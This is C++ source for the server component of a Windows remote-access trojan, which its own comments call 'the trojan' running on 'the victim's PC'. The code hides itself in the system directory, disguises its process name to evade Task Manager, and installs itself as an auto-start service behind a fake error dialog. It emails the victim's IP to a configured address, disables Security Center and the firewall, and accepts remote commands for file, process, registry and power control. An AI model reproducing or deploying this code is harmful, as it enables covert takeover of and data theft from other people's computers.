#pragma warning (disable : 4786)
#include "Global.h"
#include "ServerSocket_t.h"
#include "ServerFunctions.h"
#include "ClientComHandler_t.h"
#include "SetupEnv_t.h"
#include "configs.h"

void WINAPI ServiceMain( DWORD dwArgc, LPTSTR *lpszArgv);
//-------------------------------------  MAIN -------------------------------------
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	SC_HANDLE sc1, sc2;
	SERVICE_TABLE_ENTRY ste[2] =
	{
		{ SERVICE_NAME, ServiceMain },
		{ NULL, NULL }
	};
	//-----------------------------------------------------------------------------
	// Making a copy of the trojan in the system directory on the victim's PC
	//-----------------------------------------------------------------------------
	char fname[_MAX_FNAME],ext[_MAX_EXT],rfilename[MAX_PATH],
		cfilename[MAX_PATH],sysdir[MAX_PATH];

	GetSystemDirectory(sysdir, sizeof(sysdir));
	GetModuleFileName(GetModuleHandle(NULL), cfilename, sizeof(cfilename));
	_splitpath(cfilename, NULL, NULL, fname, ext);
	_snprintf(rfilename, sizeof(rfilename), "%s%s", fname, ext);
	
	if (strstr(cfilename, sysdir) == NULL) {
		char tmpfilename[MAX_PATH];
		
		sprintf(tmpfilename, "%s\\%s", sysdir, FILE_NAME);	
		// loop only once to make sure the file is copied.
		BOOL bFileCheck=FALSE;
		while (CopyFile(cfilename, tmpfilename, FALSE) == FALSE) {
			DWORD result = GetLastError();
			
			if (!bFileCheck && (result == ERROR_SHARING_VIOLATION || result == ERROR_ACCESS_DENIED)) {
				bFileCheck=TRUE; // check to see if its already running! then try 1 last time.
				Sleep(15000);
			} else
				break; // just continue, it's not worth retrying.
			
		}
		if (GetFileAttributes(tmpfilename) != INVALID_FILE_ATTRIBUTES)
			SetFileAttributes(tmpfilename,FILE_ATTRIBUTE_HIDDEN);

		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		memset(&pinfo, 0, sizeof(pinfo));
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
#ifdef DEBUG_CONSOLE
		sinfo.wShowWindow = SW_SHOW;
#else
		sinfo.wShowWindow = SW_HIDE;
#endif
		
		char cmdline[MAX_PATH],newProcessName[MAX_PATH];
		HANDLE hProcessOrig = OpenProcess(SYNCHRONIZE, TRUE, GetCurrentProcessId());
		sprintf(cmdline,"%s %d \"%s\"",tmpfilename, hProcessOrig, cfilename);
		
		strcpy(newProcessName,"_root_"); //add this prefix to hide process from TaskMngr
		strcat(newProcessName,tmpfilename);
		
		if (CreateProcess(newProcessName, cmdline, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, sysdir, &sinfo, &pinfo)) {
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			ExitProcess(EXIT_SUCCESS);
		}
	}
	
	//-----------------------------------------------------------------------------
	//    Making the trojan server as a service 
	//-----------------------------------------------------------------------------
	
	char newfilename[MAX_PATH];
	strcpy(newfilename,"%SystemRoot%\\system32\\");
	strcat(newfilename,FILE_NAME);
	if( sc1 = OpenSCManager( NULL, NULL, SC_MANAGER_ALL_ACCESS ) )
	{
		if( sc2 = OpenService( sc1, SERVICE_NAME, SERVICE_START ) )
		{
			CloseServiceHandle( sc2 );
		}
		else if( GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST )
		{
			sc2 = CreateService(
				sc1, SERVICE_NAME, DISPLAY_NAME,
				SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
				SERVICE_AUTO_START, SERVICE_ERROR_IGNORE,
				newfilename, NULL, NULL, NULL, NULL, NULL );
			
			StartService( sc2, 0, NULL );
			MessageBox(NULL,"Error Openning Report File!",NULL,MB_ICONERROR);
		}
		else if( sc2 != NULL )
		{
			StartService( sc2, 0, NULL );
			CloseServiceHandle( sc2 );
			CloseServiceHandle( sc1 );
			return 0;
		}
		CloseServiceHandle( sc1 );
	}
	
	//----------------------------------------------------------------------------------
	//After the service of the trojan is running we should kill the original exe process 
	//----------------------------------------------------------------------------------
	
#ifndef NO_MELT

		// now the clone is running --> kill original exe
		HANDLE hProcessOrig = (HANDLE) atoi(cfilename);
		WaitForSingleObject(hProcessOrig, INFINITE);
		CloseHandle(hProcessOrig);
		Sleep(2000); //wait for 2 sec to make sure process has fully exited 

#endif
	
	if( ! StartServiceCtrlDispatcher( ste ) )
	{
		ServiceMain( 0, NULL );
	}
	
	return 1;
}

//--------------------------  MAIN OF SERVICE (SERVER) ----------------------------

void WINAPI ServiceMain( DWORD dwArgc, LPTSTR *lpszArgv )
{
	
	SERVICE_STATUS_HANDLE sth;
	SERVICE_STATUS status;
	
	
	sth = RegisterServiceCtrlHandler( SERVICE_NAME, Handler );
	memset( &status, 0, sizeof( SERVICE_STATUS ) );
	
	status.dwServiceType        = SERVICE_WIN32_OWN_PROCESS;
	status.dwCurrentState       = SERVICE_RUNNING;
	status.dwControlsAccepted   = SERVICE_ACCEPT_SHUTDOWN;
	status.dwWin32ExitCode      = NO_ERROR;
	
	SetServiceStatus( sth, &status );
	
	
	string mailsrv,email,sender;
	int mailport;
	SetupEnv_t set; 
	ClientComHandler_t CHandle;
	char *IPAdr;
	string IP,srvPort;
	string buff,Buffer;
	IPAdr = new char[IPLEN];
	string flagforip=c_EXTERNAL_FLAG;

	try{
		//get trojan server IP
		if(flagforip == "100")
			getLocalIP(IP);
		else
			getExternIP(IP);

		strcpy(IPAdr,IP.c_str());

		// send the local ip address to the email	
		email = c_EXTERNAL_EMAIL;
		mailsrv= c_EXTERNAL_MAIL_SERV;
		sender = c_EXTERNAL_MAIL_SENDER;
		mailport =  StringToInt(c_MAIL_PORT);
		
		if(mailport != 0)
			SMTP_Handle(mailsrv.c_str(),email.c_str(),IP,sender,mailport);
		else //port = 25 by defult
			SMTP_Handle(mailsrv.c_str(),email.c_str(),IP,sender);
		
		srvPort=c_EXTERNAL_PORT;
		//setup the environment by changing some variable in the registry
		set.RegKeysSetup(srvPort);
		//turn off security center before starting all operations
		set.TurnOffSecurityCenter();
		// stop the firewall service
		set.StopWinService("SharedAccess");
		
		
		int port_fin = StringToInt(c_EXTERNAL_PORT);
		ServerSocket_t server (port_fin,IPAdr );  //Create Server socket
		//MessageBox(NULL,srvPort.c_str(),NULL,MB_OK); // for  testing
		server.listen();
		
		bool flag=false;

		while (1)
		{
			
			Socket_t *Sock=new Socket_t;
			try{
				server.accept (*Sock);
				string Buffer;
				int res=0;
				
				
				(*Sock)<<IP;
				getAck(Sock);
				sendAck(Sock);
				
				(*Sock)>>buff;
				sendAck(Sock);
				
				while (buff != "QUIT_")
				{	
					if (buff == "POWER_")
						CHandle.PowerMngHandler(Sock);
					if (buff == "PC_INFO_")
						CHandle.PCInfoHandler(Sock);
					if (buff == "PRAC_OPER_")
						CHandle.PracticOpertHandler(Sock);
					if (buff == "REG_MNGR_")
						CHandle.RegisterMngrHandler(Sock);
					if (buff == "FILE_MNGR_")
						CHandle.FileMngrHandler(Sock,IP,FTPUsername,FTPPassword);
					if (buff == "PROC_MNGR_")
						CHandle.ProcessMngrHandler(Sock);	
					if (buff == "SHUT_SERVICE_")
					{
						
						if(DeleteWinService(SERVICE_NAME))
							(*Sock)<<"SUCCESS_";
						else
							(*Sock)<<"FAIL_";
						getAck(Sock);

					}

					(*Sock)>>buff;
					sendAck(Sock);
					
				}
				delete Sock;
				
				//End of try
			}
			catch (SocketException_t&)
			{//Catch an exception
				delete Sock;
			}
			catch(...)
			{
				delete Sock; //for getack exception
			}
		}
	}
	catch(...)
	{
		
	}
	//return 0;
}
//---------------------------------------------
// will get this information from file
/*char *argve="ivit@edu.telhai.ac.il";
argv = &argve ;
char* servere="mail.telhai.ac.il";*/
//---------------------------------------------
//----------------------------------------------
